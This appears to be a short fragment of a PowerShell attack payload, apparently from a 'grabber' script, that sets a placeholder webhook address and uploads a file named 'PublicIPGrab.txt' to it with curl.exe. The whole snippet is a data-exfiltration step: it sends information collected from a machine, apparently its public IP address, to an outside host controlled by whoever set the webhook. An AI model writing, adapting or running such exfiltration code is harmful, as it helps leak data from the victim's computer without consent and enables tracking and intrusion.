$hookurl = '<webhook-address>'
$file = 'PublicIPGrab.txt'

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
